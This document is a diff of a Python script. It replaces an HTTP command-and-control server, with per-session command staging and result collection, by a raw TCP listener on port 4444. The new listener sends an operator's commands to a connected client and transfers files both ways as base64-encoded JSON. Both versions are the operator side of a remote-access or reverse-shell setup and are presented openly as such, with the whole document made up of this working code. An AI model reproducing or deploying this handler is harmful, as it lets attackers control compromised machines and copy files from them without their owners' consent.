@@ -1,55 +1,84 @@
-# handler.py
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import threading
+import socket 
+from colorama import Fore, Style, init
+import json
+import os
+import base64
 
-HOST = '0.0.0.0'
-PORT = 8000
+# Initialize colorama
+init(autoreset=True)
 
-session_cmds = {}
-session_results = {}
+# Server configuration
+HOST = "127.0.0.1"  # Replace with your server's IP address
+PORT = 4444  # Replace with your desired port
 
-class C2Handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        session_id = self.headers.get("X-Session-ID", "unknown")
-        if self.path == "/stage":
-            cmd = session_cmds.get(session_id, "")
-            self.send_response(200)
-            self.send_header("Content-type", "text/plain")
-            self.end_headers()
-            self.wfile.write(cmd.encode())
+# Print starting message
+print(Fore.GREEN + "Starting TCP Handler...")
 
-    def do_POST(self):
-        session_id = self.headers.get("X-Session-ID", "unknown")
-        if self.path == "/result":
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length).decode()
-            session_results[session_id] = post_data
-            self.send_response(200)
-            self.end_headers()
+# Set up the server
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(5)
 
-def console():
+# Wait for a connection
+print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
+client_socket, client_address = server.accept()
+print(Fore.GREEN + f"Connection established with {client_address}")
+
+def send_json(conn, data):
+    json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
+    conn.send(json_data.encode())  # Encode to bytes before sending
+
+def receive_json(conn):
+    json_data = ""
     while True:
-        if session_cmds:
-            print("\n[+] Active sessions:")
-            for sid in session_cmds:
-                print(f"  {sid}")
-        sid = input("\nSelect session ID (or type 'refresh'): ").strip()
-        if sid == "refresh":
+        try:
+            json_data = json_data + conn.recv(1024).decode()  # Decode bytes to string
+            return json.loads(json_data)  # Return full file till the end of string/dat
+        except ValueError:
             continue
-        if sid not in session_cmds:
-            print("[!] Session not found.")
-            continue
-        while True:
-            cmd = input(f"{sid}> ").strip()
-            if cmd == "back":
-                break
-            session_cmds[sid] = cmd
-            time.sleep(2)
-            result = session_results.get(sid, "[*] No response.")
-            print(result)
 
-if __name__ == "__main__":
-    server = HTTPServer((HOST, PORT), C2Handler)
-    print(f"[*] Listening on port {PORT}...")
-    threading.Thread(target=server.serve_forever, daemon=True).start()
-    console()
+def write_file(path, content):
+    with open(path, "wb") as file:  # WB for writable binary file
+        file.write(base64.b64decode(content))
+        return "[+] Download successful [+]"
+
+def read_file(path):  # RB for readable binary file
+    with open(path, "rb") as file:
+        return base64.b64encode(file.read()).decode()  # Decode bytes to string
+
+try:
+    while True:
+        # Receive the prompt from the client
+        prompt = client_socket.recv(1024).decode("utf-8")
+        print(Fore.CYAN + prompt, end="")
+
+        # Get user input
+        command = input()
+
+        # Send the command to the client
+        client_socket.sendall(command.encode("utf-8"))
+
+        if command.lower() == "km":
+            print(Fore.RED + "Disconnecting from client...")
+            client_socket.close()
+            break
+
+        # Receive the output from the client
+        if command.startswith("download"):
+            file_path = command.split(" ")[1]
+            file_content = read_file(file_path)
+            send_json(client_socket, ["download", file_path, file_content])
+            print(Fore.WHITE + f"Downloading {file_path}...")
+        elif command.startswith("upload"):
+            file_path = command.split(" ")[1]
+            content = receive_json(client_socket)
+            response = write_file(file_path, content[2])  # File content at index 2
+            print(Fore.WHITE + response)
+        else:
+            output = client_socket.recv(4096).decode("utf-8")
+            print(Fore.WHITE + output)
+
+except KeyboardInterrupt:
+    print(Fore.RED + "\nShutting down the server.")
+    client_socket.close()
+    server.close()
